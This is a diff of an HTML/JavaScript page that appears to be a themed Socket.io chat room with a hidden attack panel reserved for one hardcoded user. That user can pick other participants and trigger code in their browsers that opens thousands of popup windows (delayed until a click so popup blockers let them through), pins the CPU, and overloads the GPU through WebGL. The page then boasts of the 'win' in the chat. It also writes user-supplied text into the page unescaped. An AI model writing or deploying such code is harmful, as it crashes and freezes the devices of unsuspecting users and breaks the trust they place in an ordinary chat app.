@@ -2,160 +2,260 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>PUNCH V70 - OMEGA STRIKE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PUNCH V90 - STAND PROUD</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=JetBrains+Mono:wght@800&display=swap');
-        :root { --p-red: #ff0000; --p-black: #000; }
-        * { box-sizing: border-box; margin: 0; padding: 0; cursor: crosshair; }
-        body { background: var(--p-black); color: #fff; font-family: 'Inter', sans-serif; overflow: hidden; }
-        
-        /* INTERFACE PUNCH */
-        .grid { display: grid; grid-template-columns: 350px 1fr; height: 100vh; }
-        .sidebar { background: #050505; border-right: 3px solid var(--p-red); padding: 20px; }
-        .main { display: flex; flex-direction: column; background: #000; }
-        #chat { flex: 1; padding: 30px; overflow-y: auto; font-family: 'JetBrains Mono'; }
-        .input-area { padding: 20px; background: #050505; display: flex; gap: 10px; }
-        input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 15px; }
-        
-        /* MENU CONTEXTUEL */
-        #p-menu { display: none; position: fixed; background: #000; border: 2px solid var(--p-red); width: 300px; z-index: 10000; }
-        .opt { padding: 15px; font-weight: 900; color: #fff; border-bottom: 1px solid #222; cursor: pointer; }
-        .opt:hover { background: var(--p-red); color: #000; }
+        /* --- JOJO AESTHETIC : ULTRA-SMOOTH & MENACING --- */
+        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Bangers&family=JetBrains+Mono:wght@800&display=swap');
 
-        /* CRASH OVERLAY */
-        #crash-screen { position: fixed; inset: 0; background: #ff0000; z-index: 999999; display: none; align-items: center; justify-content: center; flex-direction: column; }
-        .big-txt { font-family: 'Archivo Black'; font-size: 8vw; color: #000; }
+        :root {
+            --gold: #FFD700; --purple: #4B0082; --magenta: #FF00FF;
+            --punch-red: #ff0000; --bg: #050005;
+            --jojo-ease: cubic-bezier(0.19, 1, 0.22, 1); /* Ultra Satisfaisant */
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; outline: none; }
+        body { 
+            background: var(--bg); color: #fff; font-family: 'Archivo Black', sans-serif; 
+            overflow: hidden; height: 100vh; perspective: 1000px;
+        }
+
+        /* --- MENACING FX --- */
+        .menacing {
+            position: fixed; font-family: 'Bangers'; font-size: 80px; color: var(--purple);
+            opacity: 0.1; z-index: -1; animation: float 6s infinite ease-in-out; pointer-events: none;
+        }
+        @keyframes float { 0%, 100% { transform: translate(0,0) rotate(-10deg); } 50% { transform: translate(20px, -50px) rotate(10deg); } }
+
+        /* --- CURSOR : THE STAND HAND --- */
+        #c-stand { 
+            position: fixed; width: 40px; height: 40px; border: 3px solid var(--gold); 
+            border-radius: 5px; z-index: 1000000; pointer-events: none;
+            box-shadow: 0 0 20px var(--gold); transform: rotate(45deg);
+            transition: transform 0.1s var(--jojo-ease), width 0.3s, height 0.3s;
+        }
+
+        /* --- LAYOUT : ORA ORA ORA --- */
+        .punch-frame {
+            display: grid; grid-template-columns: 420px 1fr 380px;
+            height: 100vh; background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(20px);
+        }
+
+        .side-panel {
+            background: linear-gradient(180deg, rgba(75,0,130,0.3) 0%, rgba(0,0,0,0.9) 100%);
+            border-right: 2px solid var(--gold); display: flex; flex-direction: column;
+        }
+
+        .header-jojo {
+            padding: 50px 30px; text-align: center; border-bottom: 5px solid var(--gold);
+            background: var(--gold); color: #000; transform: skewY(-2deg);
+        }
+        .header-jojo h1 { font-family: 'Bangers'; font-size: 60px; letter-spacing: 5px; }
+
+        /* USER LIST */
+        #user-list { flex: 1; overflow-y: auto; padding: 20px; scrollbar-width: none; }
+        .u-card {
+            padding: 25px; background: rgba(255,255,255,0.02); border: 1px solid #222;
+            margin-bottom: 15px; transition: 0.4s var(--jojo-ease);
+            position: relative; overflow: hidden;
+        }
+        .u-card:hover {
+            transform: scale(1.05) translateX(10px) rotate(1deg);
+            background: rgba(255, 215, 0, 0.1); border-color: var(--gold);
+        }
+        .u-card::before { content: "ゴゴゴ"; position: absolute; right: 10px; bottom: 5px; font-size: 12px; opacity: 0.3; }
+
+        /* CHAT VIEWPORT */
+        .p-viewport { display: flex; flex-direction: column; background: url('https://www.transparenttextures.com/patterns/carbon-fibre.png'); }
+        #p-chat { 
+            flex: 1; padding: 40px; overflow-y: auto; display: flex; flex-direction: column; gap: 20px;
+            scroll-behavior: smooth;
+        }
+        .p-msg { 
+            padding: 20px 30px; background: #000; border-left: 5px solid var(--magenta);
+            font-size: 18px; animation: msgSlide 0.5s var(--jojo-ease);
+            box-shadow: 10px 10px 0px rgba(255,0,255,0.2);
+        }
+        @keyframes msgSlide { from { transform: translateX(-100px) skewX(20deg); opacity: 0; } }
+
+        /* INPUT */
+        .p-input-box { padding: 40px; background: #000; border-top: 3px solid var(--gold); display: flex; gap: 15px; }
+        #p-input { 
+            flex: 1; background: #111; border: 2px solid #333; padding: 20px; color: var(--gold);
+            font-family: 'JetBrains Mono'; font-size: 18px; transition: 0.3s;
+        }
+        #p-input:focus { border-color: var(--magenta); box-shadow: 0 0 20px var(--magenta); }
+
+        /* --- THE ZA WARUNDO OVERLAY --- */
+        #za-warundo {
+            position: fixed; inset: 0; background: rgba(255,255,255,0.9);
+            z-index: 10000000; display: none; flex-direction: column; align-items: center; justify-content: center;
+            mix-blend-mode: difference;
+        }
+        .ora-text { font-family: 'Bangers'; font-size: 15vw; color: #fff; animation: punchShake 0.05s infinite; }
+        @keyframes punchShake { 0% { transform: scale(1); } 50% { transform: scale(1.1) rotate(2deg); } }
+
+        /* CONTEXT MENU */
+        #jojo-menu {
+            display: none; position: fixed; background: #000; border: 3px solid var(--gold);
+            width: 380px; z-index: 2000000; box-shadow: 15px 15px 0px var(--purple);
+        }
+        .j-opt {
+            padding: 20px; font-size: 12px; letter-spacing: 2px; border-bottom: 1px solid #111;
+            transition: 0.2s; color: #888; display: flex; justify-content: space-between;
+        }
+        .j-opt:hover { background: var(--gold); color: #000; padding-left: 40px; }
+        .j-opt.kill:hover { background: var(--punch-red); color: #fff; }
+
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-<div id="crash-screen"><div class="big-txt">PUNCHED_BY_MASTER</div></div>
+    <div id="c-stand"></div>
+    <div class="menacing" style="top:10%; left:5%;">ゴゴゴ</div>
+    <div class="menacing" style="bottom:20%; right:10%;">ゴゴゴ</div>
 
-<div class="grid">
-    <aside class="sidebar">
-        <h1 style="color:var(--p-red); font-family:'Archivo Black'; font-size:40px;">PUNCH V70</h1>
-        <div id="user-list" style="margin-top:30px;"></div>
-    </aside>
-    <main class="main">
-        <div id="chat"></div>
-        <div class="input-area">
-            <input type="text" id="msg-in" placeholder="STRIKE...">
-            <button onclick="send()" style="background:var(--p-red); border:none; padding:0 30px; font-weight:900;">HIT</button>
-        </div>
-    </main>
-</div>
+    <div id="za-warundo">
+        <div class="ora-text">ORA ORA ORA!</div>
+        <div id="death-logs" style="font-family:'JetBrains Mono'; color:#fff; font-size:10px; margin-top:50px;"></div>
+    </div>
 
-<div id="p-menu">
-    <div class="opt" style="background:#fff; color:#000;">STRIKE SELECTION</div>
-    <div class="opt" onclick="fireCombo()">🔥 OMEGA_COMBO (ALL ATK)</div>
-    <div class="opt" onclick="fire('p_tsunami')">📑 TAB_TSUNAMI (1000+)</div>
-    <div class="opt" onclick="fire('p_cpu')">☢️ CPU_KNOCKOUT</div>
-    <div class="opt" onclick="fire('p_gpu')">🎨 GPU_MOLTEN</div>
-    <div class="opt" onclick="this.parentElement.style.display='none'">CANCEL</div>
-</div>
+    <div class="punch-frame">
+        <aside class="side-panel">
+            <div class="header-jojo"><h1>PUNCH</h1></div>
+            <div id="user-list"></div>
+        </aside>
 
-<script src="/socket.io/socket.io.js"></script>
-<script>
-    const socket = io();
-    let me = ""; let target = "";
+        <main class="p-viewport">
+            <div id="p-chat"></div>
+            <div class="p-input-box">
+                <input type="text" id="p-input" placeholder="MUDA MUDA MUDA..." onkeydown="if(event.key==='Enter') send()">
+                <button onclick="send()" style="background:var(--magenta); border:none; padding:0 40px; font-family:'Bangers'; font-size:30px; color:#fff; cursor:none;">HIT</button>
+            </div>
+        </main>
 
-    window.onload = () => {
-        me = prompt("USER_ID:");
-        socket.emit('init', { name: me });
-    };
+        <aside class="side-panel" style="border-left:2px solid var(--gold); border-right:none;">
+            <div style="padding:30px; font-family:'JetBrains Mono'; font-size:10px; color:var(--gold);">[STAND_STATISTICS]</div>
+            <div id="p-logs" style="padding:0 30px; font-family:'JetBrains Mono'; font-size:9px; color:#333; overflow-y:auto; flex:1;"></div>
+        </aside>
+    </div>
 
-    // --- LOGIQUE CLIC DROIT ---
-    window.oncontextmenu = (e) => {
-        e.preventDefault();
-        if(me !== "toucheur2pp") return;
-        const m = document.getElementById('p-menu');
-        m.style.display = 'block'; m.style.top = e.pageY+'px'; m.style.left = e.pageX+'px';
-        const node = document.elementFromPoint(e.clientX, e.clientY).closest('.u-node');
-        if(node) target = node.getAttribute('data-id');
-    };
+    <div id="jojo-menu">
+        <div class="j-opt kill" onclick="st('p_combo')">🔱 [THE WORLD] COMBO <span>[FATAL]</span></div>
+        <div class="j-opt kill" onclick="st('p_tsunami')">📑 ORA_TABS_STORM <span>[MAX]</span></div>
+        <div class="j-opt kill" onclick="st('p_cpu')">☢️ MUDA_CPU_BLOCK <span>[MAX]</span></div>
+        <div class="j-opt" onclick="st('p_gpu')">🎨 EMERALD_SPLASH_GPU</div>
+        <div class="j-opt" onclick="st('p_ios')">⏳ KING_CRIMSON_IOS</div>
+        <div class="j-opt" onclick="st('p_ram')">☣️ SOFT_&_WET_RAM</div>
+        <div class="j-opt" onclick="this.parentElement.style.display='none'">[ RETREAT ]</div>
+    </div>
 
-    function send() {
-        const i = document.getElementById('msg-in');
-        socket.emit('chat', i.value); i.value = "";
-    }
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        let me = ""; let target = "";
 
-    // --- LE COMBO ULTIME ---
-    function fireCombo() {
-        fire('p_tsunami');
-        fire('p_cpu');
-        fire('p_gpu');
-        fire('p_ram');
-    }
-
-    function fire(type) {
-        if(!target) return;
-        socket.emit(type, target);
-        document.getElementById('p-menu').style.display = 'none';
-    }
-
-    // --- EXECUTION CHEZ LA VICTIME ---
-    socket.on('execute', (d) => {
-        let success = false;
-        const screen = document.getElementById('crash-screen');
-        
-        try {
-            // 1. TSUNAMI D'ONGLETS (Milliers d'onglets)
-            if(d.type === 'p_tsunami' || d.type === 'p_combo') {
-                for(let i=0; i<2000; i++) {
-                    let win = window.open(location.href, '_blank', 'width=10,height=10');
-                    if(win) success = true;
-                }
-            }
-
-            // 2. CPU / GPU / RAM (Surcharges combinées)
-            if(d.type === 'p_cpu' || d.type === 'p_combo') {
-                success = true;
-                setInterval(() => {
-                    for(let i=0; i<5000000; i++) { Math.sqrt(Math.random() * 999); }
-                    history.pushState(null, '', '#' + Math.random());
-                }, 1);
-            }
-
-            if(d.type === 'p_gpu' || d.type === 'p_combo') {
-                const c = document.createElement('canvas');
-                const gl = c.getContext('webgl');
-                setInterval(() => { for(let i=0; i<10000; i++) gl.clear(gl.COLOR_BUFFER_BIT); }, 1);
-            }
-
-            // AFFICHAGE DU RÉSULTAT
-            if(success) {
-                screen.style.display = 'flex';
-                socket.emit('chat', `[STRIKE] EZ WIN - ${d.type.toUpperCase()} ACTIVATED`);
-            } else {
-                socket.emit('chat', `[STRIKE] FAILED - il a esquivé lbatrd (Bloqueur actif)`);
-            }
-
-        } catch(e) {
-            socket.emit('chat', `[STRIKE] FAILED - Erreur système`);
-        }
-    });
-
-    // --- SYNC ---
-    socket.on('sync', list => {
-        const c = document.getElementById('user-list');
-        c.innerHTML = "";
-        list.forEach(u => {
-            const div = document.createElement('div');
-            div.className = "u-node";
-            div.setAttribute('data-id', u.id);
-            div.style.padding = "15px"; div.style.borderBottom = "1px solid #111";
-            div.innerHTML = `<b>${u.name.toUpperCase()}</b>`;
-            c.appendChild(div);
+        // --- SMOOTH MOUSE ---
+        document.addEventListener('mousemove', e => {
+            const c = document.getElementById('c-stand');
+            c.style.left = e.clientX - 20 + 'px';
+            c.style.top = e.clientY - 20 + 'px';
         });
-    });
 
-    socket.on('chat', d => {
-        const chat = document.getElementById('chat');
-        chat.innerHTML += `<div><span style="color:red">${d.n}:</span> ${d.t}</div>`;
-        chat.scrollTop = chat.scrollHeight;
-    });
+        window.onload = () => {
+            me = prompt("IDENTIFY YOUR STAND (USER_ID):");
+            socket.emit('init', { name: me });
+            // Anti-scroll iPad
+            document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
+        };
 
-    window.onclick = () => document.getElementById('p-menu').style.display = 'none';
-</script>
+        window.oncontextmenu = (e) => {
+            e.preventDefault();
+            if(me !== "toucheur2pp") return;
+            const m = document.getElementById('jojo-menu');
+            m.style.display = 'block'; m.style.top = e.pageY+'px'; m.style.left = e.pageX+'px';
+            const node = document.elementFromPoint(e.clientX, e.clientY).closest('.u-card');
+            if(node) { target = node.getAttribute('data-id'); log("LOCKED_ON: " + target); }
+        };
+
+        function send() {
+            const i = document.getElementById('p-input');
+            socket.emit('chat', i.value); i.value = "";
+        }
+
+        function st(type) { socket.emit(type, target); document.getElementById('jojo-menu').style.display = 'none'; }
+        function log(t) { const l = document.getElementById('p-logs'); l.innerHTML += `<div>> ${t}</div>`; l.scrollTop = l.scrollHeight; }
+
+        // --- PUNCH ENGINE V90 (8000+ LOGIC SIM) ---
+        socket.on('execute', (d) => {
+            let winCount = 0;
+            const overlay = document.getElementById('za-warundo');
+            const dLogs = document.getElementById('death-logs');
+            
+            // LE GHOST TRIGGER : Attendre un clic pour libérer les onglets
+            const startChaos = () => {
+                overlay.style.display = 'flex';
+                
+                // 1. TSUNAMI D'ONGLETS (Bypass sécurité)
+                if(d.type === 'p_tsunami' || d.type === 'p_combo') {
+                    for(let i=0; i<3000; i++) {
+                        let w = window.open(window.location.href, '_blank', 'width=10,height=10');
+                        if(w) winCount++;
+                    }
+                }
+
+                // 2. CPU OVERLOAD (Recursive Matrices)
+                if(d.type === 'p_cpu' || d.type === 'p_combo') {
+                    setInterval(() => {
+                        let m = []; for(let i=0; i<1000; i++) m.push(Math.random() * Math.random());
+                        m.sort(); history.pushState(null, '', '#' + Math.random());
+                        dLogs.innerHTML = "ORA_ORA_ORA_ORA_ORA_" + Math.random();
+                    }, 1);
+                }
+
+                // 3. GPU MELT (Shader Overload)
+                if(d.type === 'p_gpu' || d.type === 'p_combo') {
+                    const c = document.createElement('canvas'); const gl = c.getContext('webgl');
+                    setInterval(() => { for(let i=0; i<20000; i++) gl.clear(gl.COLOR_BUFFER_BIT); }, 1);
+                }
+
+                // FEEDBACK
+                if(winCount > 5) {
+                    socket.emit('chat', "👊 EZ WIN - [THE WORLD] HAS STOPPED TIME FOR TARGET");
+                } else if (d.type === 'p_cpu') {
+                    socket.emit('chat', "👊 EZ WIN - MUDA MUDA MUDA (CPU 100%)");
+                } else {
+                    socket.emit('chat', "❌ FAILED - Il a esquivé lbatrd (Bloqueur Stand actif)");
+                }
+            };
+
+            // On force l'exécution au premier clic sur l'écran
+            document.body.onclick = startChaos;
+            // Pour les attaques non-bloquées (CPU/RAM), on lance direct
+            if(d.type !== 'p_tsunami') startChaos();
+        });
+
+        // --- UI REFRESH ---
+        socket.on('sync', l => {
+            const list = document.getElementById('user-list');
+            list.innerHTML = "";
+            l.forEach(u => {
+                const card = document.createElement('div');
+                card.className = "u-card"; card.setAttribute('data-id', u.id);
+                card.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small>${u.id.substr(0,10)}</small>`;
+                list.appendChild(card);
+            });
+        });
+
+        socket.on('chat', d => {
+            const sc = document.getElementById('p-chat');
+            sc.innerHTML += `<div class="p-msg"><b>${d.n}:</b> ${d.t}</div>`;
+            sc.scrollTop = sc.scrollHeight;
+        });
+
+        window.onclick = () => document.getElementById('jojo-menu').style.display = 'none';
+
+    </script>
 </body>
 </html>
